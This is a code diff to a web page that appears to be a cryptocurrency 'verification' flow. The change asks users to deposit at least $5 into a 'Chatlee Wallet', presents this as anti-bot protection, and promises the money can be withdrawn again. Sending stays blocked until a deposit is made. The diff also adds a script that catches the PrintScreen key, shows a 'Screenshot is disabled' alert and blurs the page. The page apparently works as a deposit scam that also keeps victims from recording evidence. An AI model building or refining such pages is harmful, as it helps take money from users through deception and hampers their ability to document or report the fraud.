@@ -379,7 +379,7 @@ body{
         <!-- 3️⃣ ONCHAIN DEPOSIT VERIFICATION -->
         <div id="step2" class="card inactive">
             <h3>3. Onchain Deposit Verification</h3>
-            <p>Please make a deposit of at least $5 for the verification process. This is to ensure anti‑bot and sybil protection. <strong><i>The funds can be withdrawn again after the verification is completed.</i></strong></p>
+            <p>Please make a deposit of at least $5 to your Chatlee Wallet for the verification process. This is to ensure anti‑bot and sybil protection. <strong><i>The funds can be withdrawn again after the verification is completed.</i></strong></p>
 <br>
             <button class="btn" onclick="verifyDeposit(this)">Verify Deposit</button>
 
@@ -728,6 +728,13 @@ function receive(){
 function send(){
     showNotification('Feature are not activated.<br>Please make a deposit first.');
 }
+
+    document.addEventListener("keydown", function(e){
+    if(e.key === "PrintScreen"){
+        alert("Screenshot is disabled on this page.");
+        document.body.style.filter = "blur(10px)";
+    }
+});
 
 /* ---------- Initialise page from saved state ---------- */
 document.addEventListener('DOMContentLoaded', restoreState);
